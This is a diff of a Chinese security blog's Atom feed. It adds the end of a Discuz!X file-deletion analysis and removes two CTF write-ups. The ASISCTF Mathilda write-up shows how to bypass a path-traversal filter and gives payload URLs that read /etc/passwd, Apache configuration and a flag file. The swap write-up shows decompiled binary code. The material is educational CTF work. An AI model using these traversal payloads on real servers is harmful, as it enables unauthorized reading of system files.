+<p>在删除之间多进行了一次验证：<code>$_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;formtype&#39;] == &#39;file&#39;</code>，也就是说，若要成功删除， 需要formtype为file类型。</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>这次的漏洞修复简单粗暴，将unlink语句直接删除。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171016/12.png?raw=true" alt=""></p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="https://paper.seebug.org/411/" target="_blank" rel="external">LoRexxar:Discuz!X ≤3.4 任意文件删除漏洞分析</a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/read/2192.html" target="_blank" rel="external">0r3ak：Discuz!X 前台任意文件删除漏洞深入解析</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;代码审计学习。&lt;br&gt;玩一玩老洞应该没关系吧。。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
     <title>php文件包含漏洞</title>
     <link href="http://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
     <id>http://chybeta.github.io/2017/10/08/php文件包含漏洞/</id>
@@ -1290,107 +1449,6 @@
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ASISCTF2017-Mathilda-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/</id>
-    <published>2017-09-11T07:02:47.000Z</published>
-    <updated>2017-09-11T08:25:35.178Z</updated>
-    
-    <content type="html"><![CDATA[<p>ASISCTF2017-Mathilda-writeup<br>文件包含 apache配置userdir<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Description:</div><div class="line">Mathilda learned many skills from Leon, now she want to use them!</div><div class="line">http://178.62.48.181/</div></pre></td></tr></table></figure>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/1.png?raw=true" alt=""></p>
-<p>打开后是如上，查看源代码，发现：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/2.png?raw=true" alt=""></p>
-<p>访问：<a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 。底下有个file选项，链接为: <a href="http://178.62.48.181/~rooney/?path=rooney" target="_blank" rel="external">http://178.62.48.181/~rooney/?path=rooney</a></p>
-<p>猜测path参数存在文件包含漏洞。经过尝试，可以发现后端会把path参数里的<code>../</code>替换为空。如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/3.png?raw=true" alt=""></p>
-<p>尝试读取index.php，如果直接访问 <a href="http://178.62.48.181/~rooney/index.php?path=index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=index.php</a> ，会发现直接返回<code>Security failed!</code>，鉴于会过滤<code>../</code>，可以用<code>p../hp</code>来绕过。经过一番尝试，最后访问：<a href="http://178.62.48.181/~rooney/index.php?path=..././index.ph../p" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php?path=..././index.ph../p</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/7.png?raw=true" alt=""><br>不过似乎没啥信息。</p>
-<p>接着尝试读取 <code>/etc/passwd</code>，比如路径为 <code>../../../../etc/passwd</code>，则根据过滤，传入的参数应为：<code>..././..././..././..././etc/passwd</code>。<br>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
-<p>或者访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/index.php?path=..././..././..././..././etc/passwd</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/4.png?raw=true" alt=""></p>
-<p>最底下有一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">th1sizveryl0ngus3rn4me:x:1001:1001:,,,:/home/th1sizveryl0ngus3rn4me:/bin/bash</div></pre></td></tr></table></figure></p>
-<p>说明存在一个用户：th1sizveryl0ngus3rn4me</p>
-<p>接下来需要知道一些apache的知识。apache中有一个功能 <a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>。在多用户的操作系统上，如果apache配置了UserDir，则每个用户可以在自己的目录下建立一个web服务器，对应的url即为:<a href="http://example.com/~username/" target="_blank" rel="external">http://example.com/~username/</a> ，就本例而言 <a href="http://178.62.48.181/~rooney/" target="_blank" rel="external">http://178.62.48.181/~rooney/</a> 即表示rooney用户自己的目录的web服务器。</p>
-<p>所以尝试访问: <a href="http://178.62.48.181/~th1sizveryl0ngus3rn4me" target="_blank" rel="external">http://178.62.48.181/~th1sizveryl0ngus3rn4me</a> ，结果直接返回个 Invalid Device 。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/5.png?raw=true" alt=""></p>
-<p>继续看看关于apache:UserDir的知识。UserDir指令可以指定被网络读取的用户网站目录，有如下几种不同的形式。</p>
-<ol>
-<li>路径前没有反斜杠，则被当作用户目录下的文件夹，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /home/rooney/public_html/index.php</p>
-<ol>
-<li>路径前有反斜杠，则利用路径和文件名构造。比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/html</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/html/rooney/index.php</p>
-<ol>
-<li>如果路径中存在星号<code>*</code>，则用用户名去替代，比如配置为:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir /var/www/*/docs</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会被解释为 /var/www/rooney/docs/index.php</p>
-<ol>
-<li>设置多重路径，比如配置为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UserDir public_html /var/html</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>那么 <a href="http://178.62.48.181/~rooney/index.php" target="_blank" rel="external">http://178.62.48.181/~rooney/index.php</a> 会先去查找 /home/rooney/public_html/index.php ，如果找不到，那就去查找 /var/html/rooney/index.php</p>
-<p>以上的这些配置指令取自<a href="https://httpd.apache.org/docs/2.4/howto/public_html.html" target="_blank" rel="external">Per-user web directories</a>的例子。这些指令需要在userdir.conf中进行配置。我们尝试读取一下服务器端的userdir.conf，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././etc/apache2/mods-enabled/userdir.conf</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/8.png?raw=true" alt=""></p>
-<p>所以可以知道，如果我们访问：<br><code>http://178.62.48.181/~th1sizveryl0ngus3rn4me/index.php</code> 实际上会被apache服务器解释为 /home/th1sizveryl0ngus3rn4me/public_html/index.php 。由于直接访问不允许，我们可以利用 rooney 的文件包含来读取，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.ph../p</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/9.png?raw=true" alt=""></p>
-<p>所以看起来，我们用了非预期的解法hhh。可以看出同目录下就有flag.php，我们可以直接读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://178.62.48.181/~rooney/</div><div class="line">?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.ph../p</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170911/10.png?raw=true" alt=""></p>
-<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ASIS&#123;I_l0V3_Us3rD1r_Mpdul3!!&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;ASISCTF2017-Mathilda-writeup&lt;br&gt;文件包含 apache配置userdir&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>TWCTF 2017-swap-writeup</title>
-    <link href="http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/"/>
-    <id>http://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/</id>
-    <published>2017-09-09T06:51:02.000Z</published>
-    <updated>2017-09-11T08:26:23.370Z</updated>
-    
-    <content type="html"><![CDATA[<p>TWCTF 2017-swap-writeup<br>PLT GOT<br><a id="more"></a></p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:~/pwn/ctf/twctf$ ./swap</div><div class="line">==============================================</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice:</div></pre></td></tr></table></figure>
-<p>程序有三个功能。选1是设置两个地址，选2是交换两个地址上的值，选0是退出。用IDA反汇编后。</p>
-<p>main函数    ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax@6</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line">  __int64 v9; <span class="comment">// [sp+38h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  initialize(*(_QWORD *)&amp;argc, argv, envp);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu(*(_QWORD *)&amp;argc);</div><div class="line">      v3 = read_int(*(_QWORD *)&amp;argc);</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      LODWORD(v4) = read_ll(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = v4;</div><div class="line">      *(_QWORD *)&amp;argc = <span class="string">"Please input 2nd addr"</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      LODWORD(v5) = read_ll(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v7 = v5;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v7, <span class="number">8u</span>LL);</div><div class="line">      *(_QWORD *)&amp;argc = v7;</div><div class="line">      <span class="built_in">memcpy</span>(v7, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>其中有个read_ll()，反汇编后代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  __int64 v1; <span class="comment">// rcx@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line">  __int64 v3; <span class="comment">// [sp+118h] [bp-8h]@1</span></div><div class="line"></div><div class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  v1 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>晚上写完后再贴上来hh</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;TWCTF 2017-swap-writeup&lt;br&gt;PLT GOT&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:bin" scheme="http://chybeta.github.io/categories/writeup-bin/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
     
   </entry>
   
